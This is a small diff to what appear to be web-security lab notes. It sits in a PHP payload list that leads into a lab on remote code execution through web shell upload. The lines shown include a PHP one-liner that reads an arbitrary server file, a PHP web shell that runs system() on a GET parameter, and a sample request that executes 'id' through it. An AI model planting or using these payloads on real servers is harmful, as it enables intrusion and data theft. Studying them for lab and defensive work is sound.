@@ -5,7 +5,7 @@
 
 PHP 
 - "<"?php echo file_get_contents('/path/to/target/file'); ?">"
-- "<?php echo system($_GET['command']); ?>"
+- "<"?php echo system($_GET['command']); ?">"
 - GET /example/exploit.php?command=id HTTP/1.1
 
 ## Lab: Remote code execution via web shell upload
